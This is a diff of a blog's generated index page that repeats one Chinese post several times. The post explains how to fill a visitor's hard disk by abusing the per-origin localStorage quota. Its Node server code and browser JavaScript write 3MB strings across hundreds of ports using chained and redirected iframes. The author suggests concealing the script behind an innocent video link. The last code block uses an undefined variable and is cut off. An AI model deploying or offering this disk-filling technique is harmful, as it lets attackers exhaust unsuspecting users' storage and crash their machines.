@@ -49,7 +49,7 @@
 		  <h1 class="header-author"><a href="/">Kookokukyo</a></h1>
 		</hgroup>
 		
-		<p class="header-subtitle">世上本没多少路，走的人多了就真没有了路</p>
+		<p class="header-subtitle">Writing code is keep my heart beating only resson</p>
 		
 
 		<nav class="header-menu">
@@ -109,7 +109,7 @@
 			  <h1 class="header-author js-header-author">Kookokukyo</h1>
 			</hgroup>
 			
-			<p class="header-subtitle"><i class="icon icon-quo-left"></i>世上本没多少路，走的人多了就真没有了路<i class="icon icon-quo-right"></i></p>
+			<p class="header-subtitle"><i class="icon icon-quo-left"></i>Writing code is keep my heart beating only resson<i class="icon icon-quo-right"></i></p>
 			
 			
 			
@@ -158,19 +158,19 @@
           <div id="js-content" class="content-ll">
             
   
-    <article id="post-hello-world" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-h2" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2017/07/17/hello-world/">作为一个前端，可以如何机智地弄坏一台电脑？</a>
+      <a class="article-title" href="/2017/07/17/h2/">作为一个前端，可以如何机智地弄坏一台电脑？</a>
     </h1>
   
 
         
-        <a href="/2017/07/17/hello-world/" class="archive-article-date">
+        <a href="/2017/07/17/h2/" class="archive-article-date">
   	<time datetime="2017-07-17T12:13:34.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-07-17</time>
 </a>
         
@@ -212,7 +212,427 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2017/07/17/hello-world/">展开全文 >></a>
+          <a class="article-more-a" href="/2017/07/17/h2/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-h1" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/07/17/h1/">作为一个前端，可以如何机智地弄坏一台电脑？</a>
+    </h1>
+  
+
+        
+        <a href="/2017/07/17/h1/" class="archive-article-date">
+  	<time datetime="2017-07-17T12:13:34.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-07-17</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>有人说，前端的界限就在浏览器那儿。</p>
+<p>无论你触发了多少bug，最多导致浏览器崩溃，对系统影响不到哪去。<br>这就像二次元各种炫酷的毁灭世界，都不会导致三次元的世界末日。<br>然而，作为一个前端，我发现是有方式打开次元大门的…</p>
+<p>这个实验脑洞较大，动机无聊，但某种意义上反映了一些安全问题。<br>想象一下，有天你在家里上网，吃着火锅还唱着歌，点开一个链接，电脑突然就蓝屏了！想想还真有点小激动。</p>
+<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>故事得从localStorage说起。</p>
+<p>html5的本地存储，相信大家都不陌生。将数据以二进制文件形式存储到本地，在当前应用得非常广泛。<br>windows下的chrome，localStorage存储于C:\Users\xxx\AppData\Local\Google\Chrome\User Data\Default\Local Storage文件夹中。但如果任由网页无限写文件，对用户硬盘的伤害可想而知，因而浏览器对其做了大小限制。</p>
+<p>对于一个域名+端口，PC侧的上限是5M-10M之间，移动侧是则不大于2.5M。</p>
+<p>那么问题就变成：这样的限制足够保护用户硬盘了吗？</p>
+<h3 id="关键"><a href="#关键" class="headerlink" title="关键"></a>关键</h3><p>关键的问题在于，这一限制，针对的是一个域名+端口。<br>也就是说，你访问同一个域名的不同端口，它们的localStorage并无关联，是分开存储的。</p>
+<p>我用node简单地开启了服务器，这时，用户访问<a href="http://127.0.0.1:1000到http://127.0.0.1:1099这100个端口，会请求到同一个页面：index.html：" target="_blank" rel="external">http://127.0.0.1:1000到http://127.0.0.1:1099这100个端口，会请求到同一个页面：index.html：</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">var http = require(<span class="string">'http'</span>);</div><div class="line">var fs = require(<span class="string">'fs'</span>);</div><div class="line">//100个端口</div><div class="line"><span class="keyword">for</span>(var port = 1000; port&lt; 1100; port++)&#123;</div><div class="line">  http.createServer(<span class="keyword">function</span> (request, response) &#123;</div><div class="line">    //请忽略这种循环读文件的方式，只为了简便</div><div class="line">    fs.readFile(<span class="string">'./index.html'</span>, <span class="keyword">function</span>(err, content)&#123;</div><div class="line">      <span class="keyword">if</span>(err) &#123;</div><div class="line">      &#125; <span class="keyword">else</span> &#123;</div><div class="line">        response.writeHead(200, &#123; <span class="string">'Content-Type'</span> : <span class="string">'text/html; charset=UTF-8'</span> &#125;);</div><div class="line">        response.write(content);</div><div class="line">        response.end();</div><div class="line">      &#125;</div><div class="line">    &#125;);</div><div class="line">  &#125;).listen(port, <span class="string">'127.0.0.1'</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>当然，这个index.html里涉及了localStorage写操作。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">var s = <span class="string">""</span>;</div><div class="line">//慢慢来，别写太大了，好害怕…</div><div class="line"><span class="keyword">for</span>(var i=0; i&lt; 3 * 1024 * 1024; i++)&#123;</div><div class="line">  s += <span class="string">"0"</span>;</div><div class="line">&#125;</div><div class="line">localStorage.setItem(<span class="string">"testData"</span>, s);</div></pre></td></tr></table></figure></p>
+<p>我试着用浏览器分别访问了几个端口，结果是分开存储。一切跟剧本一样。</p>
+<h3 id="自动遍历"><a href="#自动遍历" class="headerlink" title="自动遍历"></a>自动遍历</h3><p>但这种程度还不够。<br>如果要实验变得更好（xie）玩（e）一些，问题就变成如何让用户自动遍历这些端口？</p>
+<p>iframe是个好的尝试。<br>只要一打开<a href="http://127.0.0.1" target="_blank" rel="external">http://127.0.0.1</a>: 1000，页面的脚步就会创建一个iframe，去请求<a href="http://127.0.0.1" target="_blank" rel="external">http://127.0.0.1</a>: 1001，一直循环下去。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">var Main = (<span class="function"><span class="title">function</span></span>()&#123;</div><div class="line">  var _key = <span class="string">"testData"</span>;</div><div class="line">  var _max = 1100; //最大限制</div><div class="line">  <span class="built_in">return</span> &#123;</div><div class="line">    init: <span class="function"><span class="title">function</span></span>()&#123;</div><div class="line">      //慢慢来，别写太大了，好害怕…</div><div class="line">      var s = <span class="string">""</span>;</div><div class="line">      <span class="keyword">for</span>(var i=0; i&lt; 3 * 1024 * 1024; i++)&#123;</div><div class="line">        s += <span class="string">"0"</span>;</div><div class="line">      &#125;</div><div class="line">      localStorage.setItem(_key, s);</div><div class="line">      var port = parseInt(location.port)+1;</div><div class="line">      <span class="keyword">if</span>(port &gt; _max) <span class="built_in">return</span>;</div><div class="line">      //新添加iframe</div><div class="line">      var url = <span class="string">"http://127.0.0.1:"</span> + port;</div><div class="line">      var <span class="variable">$iframe</span> = document.createElement(<span class="string">"iframe"</span>);</div><div class="line">      <span class="variable">$iframe</span>.src = url;</div><div class="line">      document.getElementsByTagName(<span class="string">"body"</span>)[0].appendChild(<span class="variable">$iframe</span>);</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">&#125;)();</div></pre></td></tr></table></figure>
+<p>当然iframe我们还可以设置为不可见，以掩盖这种不厚道的行为…<br>比方说，有人发给你一个链接，你打开后发现是个视频，而你根本注意不到背后的脚本，在视频播放的几分钟里，快要把你的C盘写满。</p>
+<p>然后我就看到请求如潮水渐涨：</p>
+<p>但是，请求到1081端口，最新的chrome就崩溃掉了…原来iframe嵌套太多，已经到达了浏览器的极限。</p>
+<p>###防止浏览器崩溃</p>
+<p>C盘还未撑满，同志还需努力。怎么办？</p>
+<p>突然想到，到达iframe极限之前，我们可以重定向啊。<br>每访问50个端口，就使用window.location.href重定向一次，去确保浏览器不崩溃。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">var Main = (<span class="function"><span class="title">function</span></span>()&#123;</div><div class="line">  var _key = <span class="string">"testData"</span>;</div><div class="line">  var _max = 1200; //最大限制</div><div class="line">  var _jumpSpace = 50; //为避免iframe过多导致浏览器crash，每50个执行跳转</div><div class="line">  <span class="built_in">return</span> &#123;</div><div class="line">    init: <span class="function"><span class="title">function</span></span>()&#123;</div><div class="line">      //慢慢来，别写太大了，好害怕…</div><div class="line">      var s = <span class="string">""</span>;</div><div class="line">      <span class="keyword">for</span>(var i=0; i&lt; 3 * 1024 * 1024; i++)&#123;</div><div class="line">        s += <span class="string">"0"</span>;</div><div class="line">      &#125;</div><div class="line">      localStorage.setItem(_key, s);</div><div class="line">      var port = parseInt(location.port)+1;</div><div class="line">      <span class="keyword">if</span>(port &gt; _max) <span class="built_in">return</span>;</div><div class="line">      <span class="keyword">if</span>(port % _jumpSpace == 0)&#123;</div><div class="line">        //每50个，重定向一次</div><div class="line">        window.location.href = url;</div><div class="line">      &#125;<span class="keyword">else</span>&#123;</div><div class="line">        //新添加iframe</div><div class="line">        var <span class="variable">$iframe</span> = document.createElement(<span class="string">"iframe"</span>);</div><div class="line">        <span class="variable">$iframe</span>.src = url;</div><div class="line">        document.getElementsByTagName(<span class="string">"body"</span>)[0].appendChild(<span class="variable">$iframe</span>);</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">&#125;)();</div></pre></td></tr></table></figure>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2017/07/17/h1/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-h4" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/07/17/h4/">作为一个前端，可以如何机智地弄坏一台电脑？</a>
+    </h1>
+  
+
+        
+        <a href="/2017/07/17/h4/" class="archive-article-date">
+  	<time datetime="2017-07-17T12:13:34.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-07-17</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>有人说，前端的界限就在浏览器那儿。</p>
+<p>无论你触发了多少bug，最多导致浏览器崩溃，对系统影响不到哪去。<br>这就像二次元各种炫酷的毁灭世界，都不会导致三次元的世界末日。<br>然而，作为一个前端，我发现是有方式打开次元大门的…</p>
+<p>这个实验脑洞较大，动机无聊，但某种意义上反映了一些安全问题。<br>想象一下，有天你在家里上网，吃着火锅还唱着歌，点开一个链接，电脑突然就蓝屏了！想想还真有点小激动。</p>
+<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>故事得从localStorage说起。</p>
+<p>html5的本地存储，相信大家都不陌生。将数据以二进制文件形式存储到本地，在当前应用得非常广泛。<br>windows下的chrome，localStorage存储于C:\Users\xxx\AppData\Local\Google\Chrome\User Data\Default\Local Storage文件夹中。但如果任由网页无限写文件，对用户硬盘的伤害可想而知，因而浏览器对其做了大小限制。</p>
+<p>对于一个域名+端口，PC侧的上限是5M-10M之间，移动侧是则不大于2.5M。</p>
+<p>那么问题就变成：这样的限制足够保护用户硬盘了吗？</p>
+<h3 id="关键"><a href="#关键" class="headerlink" title="关键"></a>关键</h3><p>关键的问题在于，这一限制，针对的是一个域名+端口。<br>也就是说，你访问同一个域名的不同端口，它们的localStorage并无关联，是分开存储的。</p>
+<p>我用node简单地开启了服务器，这时，用户访问<a href="http://127.0.0.1:1000到http://127.0.0.1:1099这100个端口，会请求到同一个页面：index.html：" target="_blank" rel="external">http://127.0.0.1:1000到http://127.0.0.1:1099这100个端口，会请求到同一个页面：index.html：</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">var http = require(<span class="string">'http'</span>);</div><div class="line">var fs = require(<span class="string">'fs'</span>);</div><div class="line">//100个端口</div><div class="line"><span class="keyword">for</span>(var port = 1000; port&lt; 1100; port++)&#123;</div><div class="line">  http.createServer(<span class="keyword">function</span> (request, response) &#123;</div><div class="line">    //请忽略这种循环读文件的方式，只为了简便</div><div class="line">    fs.readFile(<span class="string">'./index.html'</span>, <span class="keyword">function</span>(err, content)&#123;</div><div class="line">      <span class="keyword">if</span>(err) &#123;</div><div class="line">      &#125; <span class="keyword">else</span> &#123;</div><div class="line">        response.writeHead(200, &#123; <span class="string">'Content-Type'</span> : <span class="string">'text/html; charset=UTF-8'</span> &#125;);</div><div class="line">        response.write(content);</div><div class="line">        response.end();</div><div class="line">      &#125;</div><div class="line">    &#125;);</div><div class="line">  &#125;).listen(port, <span class="string">'127.0.0.1'</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>当然，这个index.html里涉及了localStorage写操作。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">var s = <span class="string">""</span>;</div><div class="line">//慢慢来，别写太大了，好害怕…</div><div class="line"><span class="keyword">for</span>(var i=0; i&lt; 3 * 1024 * 1024; i++)&#123;</div><div class="line">  s += <span class="string">"0"</span>;</div><div class="line">&#125;</div><div class="line">localStorage.setItem(<span class="string">"testData"</span>, s);</div></pre></td></tr></table></figure></p>
+<p>我试着用浏览器分别访问了几个端口，结果是分开存储。一切跟剧本一样。</p>
+<h3 id="自动遍历"><a href="#自动遍历" class="headerlink" title="自动遍历"></a>自动遍历</h3><p>但这种程度还不够。<br>如果要实验变得更好（xie）玩（e）一些，问题就变成如何让用户自动遍历这些端口？</p>
+<p>iframe是个好的尝试。<br>只要一打开<a href="http://127.0.0.1" target="_blank" rel="external">http://127.0.0.1</a>: 1000，页面的脚步就会创建一个iframe，去请求<a href="http://127.0.0.1" target="_blank" rel="external">http://127.0.0.1</a>: 1001，一直循环下去。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">var Main = (<span class="function"><span class="title">function</span></span>()&#123;</div><div class="line">  var _key = <span class="string">"testData"</span>;</div><div class="line">  var _max = 1100; //最大限制</div><div class="line">  <span class="built_in">return</span> &#123;</div><div class="line">    init: <span class="function"><span class="title">function</span></span>()&#123;</div><div class="line">      //慢慢来，别写太大了，好害怕…</div><div class="line">      var s = <span class="string">""</span>;</div><div class="line">      <span class="keyword">for</span>(var i=0; i&lt; 3 * 1024 * 1024; i++)&#123;</div><div class="line">        s += <span class="string">"0"</span>;</div><div class="line">      &#125;</div><div class="line">      localStorage.setItem(_key, s);</div><div class="line">      var port = parseInt(location.port)+1;</div><div class="line">      <span class="keyword">if</span>(port &gt; _max) <span class="built_in">return</span>;</div><div class="line">      //新添加iframe</div><div class="line">      var url = <span class="string">"http://127.0.0.1:"</span> + port;</div><div class="line">      var <span class="variable">$iframe</span> = document.createElement(<span class="string">"iframe"</span>);</div><div class="line">      <span class="variable">$iframe</span>.src = url;</div><div class="line">      document.getElementsByTagName(<span class="string">"body"</span>)[0].appendChild(<span class="variable">$iframe</span>);</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">&#125;)();</div></pre></td></tr></table></figure>
+<p>当然iframe我们还可以设置为不可见，以掩盖这种不厚道的行为…<br>比方说，有人发给你一个链接，你打开后发现是个视频，而你根本注意不到背后的脚本，在视频播放的几分钟里，快要把你的C盘写满。</p>
+<p>然后我就看到请求如潮水渐涨：</p>
+<p>但是，请求到1081端口，最新的chrome就崩溃掉了…原来iframe嵌套太多，已经到达了浏览器的极限。</p>
+<p>###防止浏览器崩溃</p>
+<p>C盘还未撑满，同志还需努力。怎么办？</p>
+<p>突然想到，到达iframe极限之前，我们可以重定向啊。<br>每访问50个端口，就使用window.location.href重定向一次，去确保浏览器不崩溃。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">var Main = (<span class="function"><span class="title">function</span></span>()&#123;</div><div class="line">  var _key = <span class="string">"testData"</span>;</div><div class="line">  var _max = 1200; //最大限制</div><div class="line">  var _jumpSpace = 50; //为避免iframe过多导致浏览器crash，每50个执行跳转</div><div class="line">  <span class="built_in">return</span> &#123;</div><div class="line">    init: <span class="function"><span class="title">function</span></span>()&#123;</div><div class="line">      //慢慢来，别写太大了，好害怕…</div><div class="line">      var s = <span class="string">""</span>;</div><div class="line">      <span class="keyword">for</span>(var i=0; i&lt; 3 * 1024 * 1024; i++)&#123;</div><div class="line">        s += <span class="string">"0"</span>;</div><div class="line">      &#125;</div><div class="line">      localStorage.setItem(_key, s);</div><div class="line">      var port = parseInt(location.port)+1;</div><div class="line">      <span class="keyword">if</span>(port &gt; _max) <span class="built_in">return</span>;</div><div class="line">      <span class="keyword">if</span>(port % _jumpSpace == 0)&#123;</div><div class="line">        //每50个，重定向一次</div><div class="line">        window.location.href = url;</div><div class="line">      &#125;<span class="keyword">else</span>&#123;</div><div class="line">        //新添加iframe</div><div class="line">        var <span class="variable">$iframe</span> = document.createElement(<span class="string">"iframe"</span>);</div><div class="line">        <span class="variable">$iframe</span>.src = url;</div><div class="line">        document.getElementsByTagName(<span class="string">"body"</span>)[0].appendChild(<span class="variable">$iframe</span>);</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">&#125;)();</div></pre></td></tr></table></figure>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2017/07/17/h4/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-h5" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/07/17/h5/">作为一个前端，可以如何机智地弄坏一台电脑？</a>
+    </h1>
+  
+
+        
+        <a href="/2017/07/17/h5/" class="archive-article-date">
+  	<time datetime="2017-07-17T12:13:34.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-07-17</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>有人说，前端的界限就在浏览器那儿。</p>
+<p>无论你触发了多少bug，最多导致浏览器崩溃，对系统影响不到哪去。<br>这就像二次元各种炫酷的毁灭世界，都不会导致三次元的世界末日。<br>然而，作为一个前端，我发现是有方式打开次元大门的…</p>
+<p>这个实验脑洞较大，动机无聊，但某种意义上反映了一些安全问题。<br>想象一下，有天你在家里上网，吃着火锅还唱着歌，点开一个链接，电脑突然就蓝屏了！想想还真有点小激动。</p>
+<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>故事得从localStorage说起。</p>
+<p>html5的本地存储，相信大家都不陌生。将数据以二进制文件形式存储到本地，在当前应用得非常广泛。<br>windows下的chrome，localStorage存储于C:\Users\xxx\AppData\Local\Google\Chrome\User Data\Default\Local Storage文件夹中。但如果任由网页无限写文件，对用户硬盘的伤害可想而知，因而浏览器对其做了大小限制。</p>
+<p>对于一个域名+端口，PC侧的上限是5M-10M之间，移动侧是则不大于2.5M。</p>
+<p>那么问题就变成：这样的限制足够保护用户硬盘了吗？</p>
+<h3 id="关键"><a href="#关键" class="headerlink" title="关键"></a>关键</h3><p>关键的问题在于，这一限制，针对的是一个域名+端口。<br>也就是说，你访问同一个域名的不同端口，它们的localStorage并无关联，是分开存储的。</p>
+<p>我用node简单地开启了服务器，这时，用户访问<a href="http://127.0.0.1:1000到http://127.0.0.1:1099这100个端口，会请求到同一个页面：index.html：" target="_blank" rel="external">http://127.0.0.1:1000到http://127.0.0.1:1099这100个端口，会请求到同一个页面：index.html：</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">var http = require(<span class="string">'http'</span>);</div><div class="line">var fs = require(<span class="string">'fs'</span>);</div><div class="line">//100个端口</div><div class="line"><span class="keyword">for</span>(var port = 1000; port&lt; 1100; port++)&#123;</div><div class="line">  http.createServer(<span class="keyword">function</span> (request, response) &#123;</div><div class="line">    //请忽略这种循环读文件的方式，只为了简便</div><div class="line">    fs.readFile(<span class="string">'./index.html'</span>, <span class="keyword">function</span>(err, content)&#123;</div><div class="line">      <span class="keyword">if</span>(err) &#123;</div><div class="line">      &#125; <span class="keyword">else</span> &#123;</div><div class="line">        response.writeHead(200, &#123; <span class="string">'Content-Type'</span> : <span class="string">'text/html; charset=UTF-8'</span> &#125;);</div><div class="line">        response.write(content);</div><div class="line">        response.end();</div><div class="line">      &#125;</div><div class="line">    &#125;);</div><div class="line">  &#125;).listen(port, <span class="string">'127.0.0.1'</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>当然，这个index.html里涉及了localStorage写操作。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">var s = <span class="string">""</span>;</div><div class="line">//慢慢来，别写太大了，好害怕…</div><div class="line"><span class="keyword">for</span>(var i=0; i&lt; 3 * 1024 * 1024; i++)&#123;</div><div class="line">  s += <span class="string">"0"</span>;</div><div class="line">&#125;</div><div class="line">localStorage.setItem(<span class="string">"testData"</span>, s);</div></pre></td></tr></table></figure></p>
+<p>我试着用浏览器分别访问了几个端口，结果是分开存储。一切跟剧本一样。</p>
+<h3 id="自动遍历"><a href="#自动遍历" class="headerlink" title="自动遍历"></a>自动遍历</h3><p>但这种程度还不够。<br>如果要实验变得更好（xie）玩（e）一些，问题就变成如何让用户自动遍历这些端口？</p>
+<p>iframe是个好的尝试。<br>只要一打开<a href="http://127.0.0.1" target="_blank" rel="external">http://127.0.0.1</a>: 1000，页面的脚步就会创建一个iframe，去请求<a href="http://127.0.0.1" target="_blank" rel="external">http://127.0.0.1</a>: 1001，一直循环下去。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">var Main = (<span class="function"><span class="title">function</span></span>()&#123;</div><div class="line">  var _key = <span class="string">"testData"</span>;</div><div class="line">  var _max = 1100; //最大限制</div><div class="line">  <span class="built_in">return</span> &#123;</div><div class="line">    init: <span class="function"><span class="title">function</span></span>()&#123;</div><div class="line">      //慢慢来，别写太大了，好害怕…</div><div class="line">      var s = <span class="string">""</span>;</div><div class="line">      <span class="keyword">for</span>(var i=0; i&lt; 3 * 1024 * 1024; i++)&#123;</div><div class="line">        s += <span class="string">"0"</span>;</div><div class="line">      &#125;</div><div class="line">      localStorage.setItem(_key, s);</div><div class="line">      var port = parseInt(location.port)+1;</div><div class="line">      <span class="keyword">if</span>(port &gt; _max) <span class="built_in">return</span>;</div><div class="line">      //新添加iframe</div><div class="line">      var url = <span class="string">"http://127.0.0.1:"</span> + port;</div><div class="line">      var <span class="variable">$iframe</span> = document.createElement(<span class="string">"iframe"</span>);</div><div class="line">      <span class="variable">$iframe</span>.src = url;</div><div class="line">      document.getElementsByTagName(<span class="string">"body"</span>)[0].appendChild(<span class="variable">$iframe</span>);</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">&#125;)();</div></pre></td></tr></table></figure>
+<p>当然iframe我们还可以设置为不可见，以掩盖这种不厚道的行为…<br>比方说，有人发给你一个链接，你打开后发现是个视频，而你根本注意不到背后的脚本，在视频播放的几分钟里，快要把你的C盘写满。</p>
+<p>然后我就看到请求如潮水渐涨：</p>
+<p>但是，请求到1081端口，最新的chrome就崩溃掉了…原来iframe嵌套太多，已经到达了浏览器的极限。</p>
+<p>###防止浏览器崩溃</p>
+<p>C盘还未撑满，同志还需努力。怎么办？</p>
+<p>突然想到，到达iframe极限之前，我们可以重定向啊。<br>每访问50个端口，就使用window.location.href重定向一次，去确保浏览器不崩溃。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">var Main = (<span class="function"><span class="title">function</span></span>()&#123;</div><div class="line">  var _key = <span class="string">"testData"</span>;</div><div class="line">  var _max = 1200; //最大限制</div><div class="line">  var _jumpSpace = 50; //为避免iframe过多导致浏览器crash，每50个执行跳转</div><div class="line">  <span class="built_in">return</span> &#123;</div><div class="line">    init: <span class="function"><span class="title">function</span></span>()&#123;</div><div class="line">      //慢慢来，别写太大了，好害怕…</div><div class="line">      var s = <span class="string">""</span>;</div><div class="line">      <span class="keyword">for</span>(var i=0; i&lt; 3 * 1024 * 1024; i++)&#123;</div><div class="line">        s += <span class="string">"0"</span>;</div><div class="line">      &#125;</div><div class="line">      localStorage.setItem(_key, s);</div><div class="line">      var port = parseInt(location.port)+1;</div><div class="line">      <span class="keyword">if</span>(port &gt; _max) <span 